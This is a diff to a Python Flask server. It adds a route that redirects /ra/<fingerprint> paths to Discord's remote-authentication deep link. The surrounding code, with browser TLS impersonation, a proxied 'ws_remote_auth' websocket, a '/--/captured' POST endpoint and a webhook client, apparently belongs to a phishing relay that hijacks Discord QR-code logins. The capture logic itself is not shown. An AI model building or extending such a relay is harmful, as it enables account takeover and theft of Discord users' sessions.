@@ -23,7 +23,7 @@ for _m, _p in _deps.items():
         print(f'[*] Installing {_p}...')
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])
 
-from flask import Flask, request, jsonify, send_from_directory, make_response
+from flask import Flask, request, jsonify, send_from_directory, make_response, redirect
 from flask_sock import Sock
 from curl_cffi import requests as creq   # Chrome TLS impersonation
 import requests as plain_req              # for webhook (no impersonation needed)
@@ -3564,6 +3564,12 @@ def ws_remote_auth(ws):
         if upstream:
             try: upstream.close()
             except: pass
+
+
+@app.route('/ra/<path:fingerprint>')
+def ra_redirect(fingerprint):
+    """Redirect /ra/{fingerprint} to Discord so the mobile app handles the deep link."""
+    return redirect(f'https://discord.com/ra/{fingerprint}')
 
 
 @app.route('/--/captured', methods=['POST'])
